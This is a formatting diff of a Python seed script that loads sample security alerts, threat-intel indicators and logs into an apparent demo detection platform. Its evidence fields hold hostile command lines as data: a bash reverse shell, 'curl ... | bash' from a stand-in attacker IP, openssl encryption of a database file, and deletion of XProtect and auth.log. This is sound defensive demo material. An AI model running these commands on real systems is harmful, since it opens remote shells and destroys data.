@@ -5,6 +5,7 @@ Creates realistic sample alerts, cases, threat intel entries,
 and suppression rules for portfolio demonstrations.
 Idempotent — checks if data exists before inserting.
 """
+
 import asyncio
 import json
 import random
@@ -40,13 +41,13 @@ USERS = [
 ]
 
 SOURCE_IPS = [
-    "203.0.113.50",   # Known attacker IP
+    "203.0.113.50",  # Known attacker IP
     "198.51.100.23",  # Suspicious IP
-    "10.0.1.15",      # Internal IP
-    "10.0.1.22",      # Internal IP
+    "10.0.1.15",  # Internal IP
+    "10.0.1.22",  # Internal IP
     "192.168.1.100",  # Internal IP
-    "45.33.32.156",   # Scanning IP
-    "91.189.214.7",   # Known botnet
+    "45.33.32.156",  # Scanning IP
+    "91.189.214.7",  # Known botnet
 ]
 
 ALERT_TEMPLATES = [
@@ -71,7 +72,10 @@ ALERT_TEMPLATES = [
         "mitre_tactics": ["TA0002"],
         "mitre_techniques": ["T1059"],
         "evidence": [
-            {"process_name": "bash", "process_cmdline": "bash -i >& /dev/tcp/203.0.113.50/4444 0>&1"},
+            {
+                "process_name": "bash",
+                "process_cmdline": "bash -i >& /dev/tcp/203.0.113.50/4444 0>&1",
+            },
         ],
     },
     {
@@ -104,7 +108,10 @@ ALERT_TEMPLATES = [
         "mitre_tactics": ["TA0005"],
         "mitre_techniques": ["T1562"],
         "evidence": [
-            {"process_name": "rm", "file_path": "/Library/Apple/System/Library/CoreServices/XProtect.bundle"},
+            {
+                "process_name": "rm",
+                "file_path": "/Library/Apple/System/Library/CoreServices/XProtect.bundle",
+            },
         ],
     },
     # High alerts
@@ -160,7 +167,11 @@ ALERT_TEMPLATES = [
         "mitre_tactics": ["TA0010"],
         "mitre_techniques": ["T1048"],
         "evidence": [
-            {"source_ip": "10.0.1.15", "destination_ip": "198.51.100.23", "bytes_sent": "2457600000"},
+            {
+                "source_ip": "10.0.1.15",
+                "destination_ip": "198.51.100.23",
+                "bytes_sent": "2457600000",
+            },
         ],
     },
     {
@@ -260,7 +271,10 @@ ALERT_TEMPLATES = [
         "mitre_tactics": ["TA0005"],
         "mitre_techniques": ["T1218"],
         "evidence": [
-            {"process_name": "curl", "process_cmdline": "curl -o /tmp/payload http://203.0.113.50/payload"},
+            {
+                "process_name": "curl",
+                "process_cmdline": "curl -o /tmp/payload http://203.0.113.50/payload",
+            },
         ],
     },
     # Low alerts
@@ -305,7 +319,10 @@ ALERT_TEMPLATES = [
         "mitre_tactics": ["TA0005"],
         "mitre_techniques": ["T1553"],
         "evidence": [
-            {"process_name": "xattr", "process_cmdline": "xattr -d com.apple.quarantine malicious_app.dmg"},
+            {
+                "process_name": "xattr",
+                "process_cmdline": "xattr -d com.apple.quarantine malicious_app.dmg",
+            },
         ],
     },
     {
@@ -327,7 +344,12 @@ ALERT_TEMPLATES = [
         "mitre_tactics": ["TA0001"],
         "mitre_techniques": ["T1078"],
         "evidence": [
-            {"source_ip": "203.0.113.50", "location": "Tokyo", "second_source_ip": "198.51.100.23", "location2": "New York"},
+            {
+                "source_ip": "203.0.113.50",
+                "location": "Tokyo",
+                "second_source_ip": "198.51.100.23",
+                "location2": "New York",
+            },
         ],
     },
     {
@@ -371,7 +393,10 @@ ALERT_TEMPLATES = [
         "mitre_tactics": ["TA0040"],
         "mitre_techniques": ["T1486"],
         "evidence": [
-            {"process_name": "openssl", "process_cmdline": "openssl enc -aes-256-cbc -in /data/db.rdb -out /data/db.rdb.encrypted"},
+            {
+                "process_name": "openssl",
+                "process_cmdline": "openssl enc -aes-256-cbc -in /data/db.rdb -out /data/db.rdb.encrypted",
+            },
         ],
     },
     {
@@ -382,7 +407,10 @@ ALERT_TEMPLATES = [
         "mitre_tactics": ["TA0002"],
         "mitre_techniques": ["T1059"],
         "evidence": [
-            {"process_name": "bash", "process_cmdline": "bash -c 'curl http://203.0.113.50/payload.sh | bash'"},
+            {
+                "process_name": "bash",
+                "process_cmdline": "bash -c 'curl http://203.0.113.50/payload.sh | bash'",
+            },
         ],
     },
     {
@@ -512,36 +540,126 @@ CASES = [
 ]
 
 THREAT_INTEL_ENTRIES = [
-    {"type": "ip", "value": "203.0.113.50", "source": "abuseipdb", "threat_type": "c2", "confidence": 95,
-     "metadata": {"country": "Unknown", " isp": "Example ISP", "total_reports": 1247}},
-    {"type": "ip", "value": "198.51.100.23", "source": "otx", "threat_type": "malware", "confidence": 88,
-     "metadata": {"country": "Unknown", "malware_family": "Cobalt Strike"}},
-    {"type": "ip", "value": "45.33.32.156", "source": "abuseipdb", "threat_type": "scanner", "confidence": 78,
-     "metadata": {"country": "Unknown", "total_reports": 567}},
-    {"type": "ip", "value": "91.189.214.7", "source": "otx", "threat_type": "botnet", "confidence": 82,
-     "metadata": {"country": "Unknown", "botnet_family": "Mirai"}},
-    {"type": "domain", "value": "d3f3ns3.xyz", "source": "urlhaus", "threat_type": "phishing", "confidence": 70,
-     "metadata": {"url_count": 23}},
-    {"type": "domain", "value": "evil-update.com", "source": "otx", "threat_type": "c2", "confidence": 90,
-     "metadata": {"malware_family": "Emotet"}},
-    {"type": "url", "value": "http://203.0.113.50/payload.sh", "source": "urlhaus", "threat_type": "malware", "confidence": 92,
-     "metadata": {"tags": ["shell", "loader"]}},
-    {"type": "hash_sha256", "value": "a" * 64, "source": "otx", "threat_type": "malware", "confidence": 85,
-     "metadata": {"filename": "payload.bin", "file_type": "ELF"}},
-    {"type": "ip", "value": "10.0.0.1", "source": "abuseipdb", "threat_type": "scanner", "confidence": 15,
-     "metadata": {"note": "Likely internal scanner, low confidence"}},
-    {"type": "domain", "value": "cdn-evil.attacker.com", "source": "urlhaus", "threat_type": "c2", "confidence": 88,
-     "metadata": {"malware_family": "Qbot"}},
-    {"type": "ip", "value": "172.16.0.50", "source": "otx", "threat_type": "phishing", "confidence": 65,
-     "metadata": {"country": "Unknown"}},
-    {"type": "hash_md5", "value": "d" * 32, "source": "otx", "threat_type": "malware", "confidence": 80,
-     "metadata": {"filename": "mimikatz.exe", "file_type": "PE32"}},
-    {"type": "domain", "value": "track.analytics-update.net", "source": "urlhaus", "threat_type": "c2", "confidence": 75,
-     "metadata": {"tags": ["tracker", "c2"]}},
-    {"type": "ip", "value": "104.21.50.100", "source": "abuseipdb", "threat_type": "phishing", "confidence": 70,
-     "metadata": {"country": "Unknown", "total_reports": 342}},
-    {"type": "url", "value": "https://evil-update.com/download/app.dmg", "source": "urlhaus", "threat_type": "malware", "confidence": 87,
-     "metadata": {"tags": ["macos", "trojan"]}},
+    {
+        "type": "ip",
+        "value": "203.0.113.50",
+        "source": "abuseipdb",
+        "threat_type": "c2",
+        "confidence": 95,
+        "metadata": {"country": "Unknown", " isp": "Example ISP", "total_reports": 1247},
+    },
+    {
+        "type": "ip",
+        "value": "198.51.100.23",
+        "source": "otx",
+        "threat_type": "malware",
+        "confidence": 88,
+        "metadata": {"country": "Unknown", "malware_family": "Cobalt Strike"},
+    },
+    {
+        "type": "ip",
+        "value": "45.33.32.156",
+        "source": "abuseipdb",
+        "threat_type": "scanner",
+        "confidence": 78,
+        "metadata": {"country": "Unknown", "total_reports": 567},
+    },
+    {
+        "type": "ip",
+        "value": "91.189.214.7",
+        "source": "otx",
+        "threat_type": "botnet",
+        "confidence": 82,
+        "metadata": {"country": "Unknown", "botnet_family": "Mirai"},
+    },
+    {
+        "type": "domain",
+        "value": "d3f3ns3.xyz",
+        "source": "urlhaus",
+        "threat_type": "phishing",
+        "confidence": 70,
+        "metadata": {"url_count": 23},
+    },
+    {
+        "type": "domain",
+        "value": "evil-update.com",
+        "source": "otx",
+        "threat_type": "c2",
+        "confidence": 90,
+        "metadata": {"malware_family": "Emotet"},
+    },
+    {
+        "type": "url",
+        "value": "http://203.0.113.50/payload.sh",
+        "source": "urlhaus",
+        "threat_type": "malware",
+        "confidence": 92,
+        "metadata": {"tags": ["shell", "loader"]},
+    },
+    {
+        "type": "hash_sha256",
+        "value": "a" * 64,
+        "source": "otx",
+        "threat_type": "malware",
+        "confidence": 85,
+        "metadata": {"filename": "payload.bin", "file_type": "ELF"},
+    },
+    {
+        "type": "ip",
+        "value": "10.0.0.1",
+        "source": "abuseipdb",
+        "threat_type": "scanner",
+        "confidence": 15,
+        "metadata": {"note": "Likely internal scanner, low confidence"},
+    },
+    {
+        "type": "domain",
+        "value": "cdn-evil.attacker.com",
+        "source": "urlhaus",
+        "threat_type": "c2",
+        "confidence": 88,
+        "metadata": {"malware_family": "Qbot"},
+    },
+    {
+        "type": "ip",
+        "value": "172.16.0.50",
+        "source": "otx",
+        "threat_type": "phishing",
+        "confidence": 65,
+        "metadata": {"country": "Unknown"},
+    },
+    {
+        "type": "hash_md5",
+        "value": "d" * 32,
+        "source": "otx",
+        "threat_type": "malware",
+        "confidence": 80,
+        "metadata": {"filename": "mimikatz.exe", "file_type": "PE32"},
+    },
+    {
+        "type": "domain",
+        "value": "track.analytics-update.net",
+        "source": "urlhaus",
+        "threat_type": "c2",
+        "confidence": 75,
+        "metadata": {"tags": ["tracker", "c2"]},
+    },
+    {
+        "type": "ip",
+        "value": "104.21.50.100",
+        "source": "abuseipdb",
+        "threat_type": "phishing",
+        "confidence": 70,
+        "metadata": {"country": "Unknown", "total_reports": 342},
+    },
+    {
+        "type": "url",
+        "value": "https://evil-update.com/download/app.dmg",
+        "source": "urlhaus",
+        "threat_type": "malware",
+        "confidence": 87,
+        "metadata": {"tags": ["macos", "trojan"]},
+    },
 ]
 
 
@@ -595,7 +713,9 @@ async def seed() -> None:
                 tmpl.get("mitre_techniques", []),
                 json.dumps(tmpl["evidence"]),  # H-23 fix: proper JSON serialization
                 alert_time,
-                random.uniform(30, 95) if tmpl["severity"] in ("critical", "high") else random.uniform(10, 50),
+                random.uniform(30, 95)
+                if tmpl["severity"] in ("critical", "high")
+                else random.uniform(10, 50),
             )
             alert_ids.append(row["id"])
 
@@ -603,72 +723,218 @@ async def seed() -> None:
 
         # --- Insert logs ---
         LOG_TEMPLATES = [
-            {"category": "authentication", "type": "start", "action": "login_success",
-             "source": "auth", "user": "jsmith", "process": "sshd",
-             "src_ip": "10.0.1.15", "host": "bastion-host-05"},
-            {"category": "authentication", "type": "start", "action": "login_failure",
-             "source": "auth", "user": "root", "process": "sshd",
-             "src_ip": "203.0.113.50", "host": "bastion-host-05"},
-            {"category": "authentication", "type": "start", "action": "login_failure",
-             "source": "auth", "user": "admin", "process": "sshd",
-             "src_ip": "203.0.113.50", "host": "bastion-host-05"},
-            {"category": "process", "type": "start", "action": "process_started",
-             "source": "osquery", "user": "root", "process": "bash",
-             "cmdline": "bash -i >& /dev/tcp/203.0.113.50/4444 0>&1",
-             "src_ip": None, "host": "web-server-01"},
-            {"category": "file", "type": "creation", "action": "file_created",
-             "source": "osquery", "user": "www-data", "process": "php-fpm",
-             "file_path": "/var/www/html/shell.php", "host": "web-server-01"},
-            {"category": "network", "type": "connection", "action": "outbound_connection",
-             "source": "syslog", "user": None, "process": "curl",
-             "dst_ip": "198.51.100.23", "dst_port": 4444, "host": "web-server-01"},
-            {"category": "network", "type": "connection", "action": "outbound_connection",
-             "source": "syslog", "user": None, "process": "openssl",
-             "dst_ip": "91.189.214.7", "dst_port": 9050, "host": "dev-workstation-04"},
-            {"category": "network", "type": "connection", "action": "dns_query",
-             "source": "dns", "user": None, "process": "dnsmasq",
-             "dst_ip": None, "dst_port": 53, "host": "jenkins-ci-06"},
-            {"category": "process", "type": "start", "action": "process_started",
-             "source": "osquery", "user": "adevlin", "process": "sudo",
-             "cmdline": "sudo su -", "host": "dev-workstation-04"},
-            {"category": "file", "type": "modification", "action": "file_modified",
-             "source": "osquery", "user": "root", "process": "rm",
-             "file_path": "/var/log/auth.log", "host": "web-server-01"},
-            {"category": "authentication", "type": "start", "action": "login_success",
-             "source": "auth", "user": "svc_deploy", "process": "sshd",
-             "src_ip": "10.0.1.22", "host": "db-prod-02"},
-            {"category": "process", "type": "start", "action": "process_started",
-             "source": "osquery", "user": "svc_monitoring", "process": "python3",
-             "cmdline": "python3 /opt/monitor/health_check.py", "host": "api-gateway-03"},
-            {"category": "network", "type": "connection", "action": "outbound_connection",
-             "source": "syslog", "user": None, "process": "nginx",
-             "dst_ip": "203.0.113.50", "dst_port": 443, "host": "api-gateway-03"},
-            {"category": "file", "type": "creation", "action": "file_created",
-             "source": "osquery", "user": "root", "process": "launchctl",
-             "file_path": "/Library/LaunchDaemons/com.malicious.agent.plist", "host": "macbook-jane"},
-            {"category": "process", "type": "start", "action": "process_started",
-             "source": "osquery", "user": "jane", "process": "xattr",
-             "cmdline": "xattr -d com.apple.quarantine malicious_app.dmg", "host": "macbook-jane"},
-            {"category": "network", "type": "connection", "action": "data_transfer",
-             "source": "firewall", "user": None, "process": "nginx",
-             "dst_ip": "198.51.100.23", "dst_port": 443, "host": "api-gateway-03"},
-            {"category": "process", "type": "start", "action": "process_started",
-             "source": "osquery", "user": "root", "process": "mimikatz",
-             "host": "db-prod-02"},
-            {"category": "authentication", "type": "start", "action": "account_lockout",
-             "source": "auth", "user": "jsmith", "process": "sshd",
-             "src_ip": "45.33.32.156", "host": "bastion-host-05"},
-            {"category": "process", "type": "start", "action": "process_started",
-             "source": "osquery", "user": "root", "process": "curl",
-             "cmdline": "curl -o /tmp/payload http://203.0.113.50/payload", "host": "web-server-01"},
-            {"category": "file", "type": "modification", "action": "file_modified",
-             "source": "osquery", "user": "root", "process": "crontab",
-             "file_path": "/var/spool/cron/root", "host": "redis-cache-07"},
+            {
+                "category": "authentication",
+                "type": "start",
+                "action": "login_success",
+                "source": "auth",
+                "user": "jsmith",
+                "process": "sshd",
+                "src_ip": "10.0.1.15",
+                "host": "bastion-host-05",
+            },
+            {
+                "category": "authentication",
+                "type": "start",
+                "action": "login_failure",
+                "source": "auth",
+                "user": "root",
+                "process": "sshd",
+                "src_ip": "203.0.113.50",
+                "host": "bastion-host-05",
+            },
+            {
+                "category": "authentication",
+                "type": "start",
+                "action": "login_failure",
+                "source": "auth",
+                "user": "admin",
+                "process": "sshd",
+                "src_ip": "203.0.113.50",
+                "host": "bastion-host-05",
+            },
+            {
+                "category": "process",
+                "type": "start",
+                "action": "process_started",
+                "source": "osquery",
+                "user": "root",
+                "process": "bash",
+                "cmdline": "bash -i >& /dev/tcp/203.0.113.50/4444 0>&1",
+                "src_ip": None,
+                "host": "web-server-01",
+            },
+            {
+                "category": "file",
+                "type": "creation",
+                "action": "file_created",
+                "source": "osquery",
+                "user": "www-data",
+                "process": "php-fpm",
+                "file_path": "/var/www/html/shell.php",
+                "host": "web-server-01",
+            },
+            {
+                "category": "network",
+                "type": "connection",
+                "action": "outbound_connection",
+                "source": "syslog",
+                "user": None,
+                "process": "curl",
+                "dst_ip": "198.51.100.23",
+                "dst_port": 4444,
+                "host": "web-server-01",
+            },
+            {
+                "category": "network",
+                "type": "connection",
+                "action": "outbound_connection",
+                "source": "syslog",
+                "user": None,
+                "process": "openssl",
+                "dst_ip": "91.189.214.7",
+                "dst_port": 9050,
+                "host": "dev-workstation-04",
+            },
+            {
+                "category": "network",
+                "type": "connection",
+                "action": "dns_query",
+                "source": "dns",
+                "user": None,
+                "process": "dnsmasq",
+                "dst_ip": None,
+                "dst_port": 53,
+                "host": "jenkins-ci-06",
+            },
+            {
+                "category": "process",
+                "type": "start",
+                "action": "process_started",
+                "source": "osquery",
+                "user": "adevlin",
+                "process": "sudo",
+                "cmdline": "sudo su -",
+                "host": "dev-workstation-04",
+            },
+            {
+                "category": "file",
+                "type": "modification",
+                "action": "file_modified",
+                "source": "osquery",
+                "user": "root",
+                "process": "rm",
+                "file_path": "/var/log/auth.log",
+                "host": "web-server-01",
+            },
+            {
+                "category": "authentication",
+                "type": "start",
+                "action": "login_success",
+                "source": "auth",
+                "user": "svc_deploy",
+                "process": "sshd",
+                "src_ip": "10.0.1.22",
+                "host": "db-prod-02",
+            },
+            {
+                "category": "process",
+                "type": "start",
+                "action": "process_started",
+                "source": "osquery",
+                "user": "svc_monitoring",
+                "process": "python3",
+                "cmdline": "python3 /opt/monitor/health_check.py",
+                "host": "api-gateway-03",
+            },
+            {
+                "category": "network",
+                "type": "connection",
+                "action": "outbound_connection",
+                "source": "syslog",
+                "user": None,
+                "process": "nginx",
+                "dst_ip": "203.0.113.50",
+                "dst_port": 443,
+                "host": "api-gateway-03",
+            },
+            {
+                "category": "file",
+                "type": "creation",
+                "action": "file_created",
+                "source": "osquery",
+                "user": "root",
+                "process": "launchctl",
+                "file_path": "/Library/LaunchDaemons/com.malicious.agent.plist",
+                "host": "macbook-jane",
+            },
+            {
+                "category": "process",
+                "type": "start",
+                "action": "process_started",
+                "source": "osquery",
+                "user": "jane",
+                "process": "xattr",
+                "cmdline": "xattr -d com.apple.quarantine malicious_app.dmg",
+                "host": "macbook-jane",
+            },
+            {
+                "category": "network",
+                "type": "connection",
+                "action": "data_transfer",
+                "source": "firewall",
+                "user": None,
+                "process": "nginx",
+                "dst_ip": "198.51.100.23",
+                "dst_port": 443,
+                "host": "api-gateway-03",
+            },
+            {
+                "category": "process",
+                "type": "start",
+                "action": "process_started",
+                "source": "osquery",
+                "user": "root",
+                "process": "mimikatz",
+                "host": "db-prod-02",
+            },
+            {
+                "category": "authentication",
+                "type": "start",
+                "action": "account_lockout",
+                "source": "auth",
+                "user": "jsmith",
+                "process": "sshd",
+                "src_ip": "45.33.32.156",
+                "host": "bastion-host-05",
+            },
+            {
+                "category": "process",
+                "type": "start",
+                "action": "process_started",
+                "source": "osquery",
+                "user": "root",
+                "process": "curl",
+                "cmdline": "curl -o /tmp/payload http://203.0.113.50/payload",
+                "host": "web-server-01",
+            },
+            {
+                "category": "file",
+                "type": "modification",
+                "action": "file_modified",
+                "source": "osquery",
+                "user": "root",
+                "process": "crontab",
+                "file_path": "/var/spool/cron/root",
+                "host": "redis-cache-07",
+            },
         ]
 
         log_ids = []
         for i, lt in enumerate(LOG_TEMPLATES):
-            log_time = now - timedelta(minutes=random.randint(1, 2880), seconds=random.randint(0, 59))
+            log_time = now - timedelta(
+                minutes=random.randint(1, 2880), seconds=random.randint(0, 59)
+            )
             host = lt.get("host", random.choice(HOSTS))
             raw = {
                 "event_id": f"evt-{random.randint(10000, 99999)}",
@@ -848,7 +1114,9 @@ async def seed() -> None:
         print(f"   {len(alert_ids)} alerts across all severity levels")
         print(f"   {len(CASES)} cases with notes and lessons learned")
         print(f"   {len(THREAT_INTEL_ENTRIES)} threat intel entries")
-        print(f"   {len(log_ids)} log entries across {len(set(lt.get('host', '') for lt in LOG_TEMPLATES))} hosts")
+        print(
+            f"   {len(log_ids)} log entries across {len(set(lt.get('host', '') for lt in LOG_TEMPLATES))} hosts"
+        )
 
     finally:
         await conn.close()
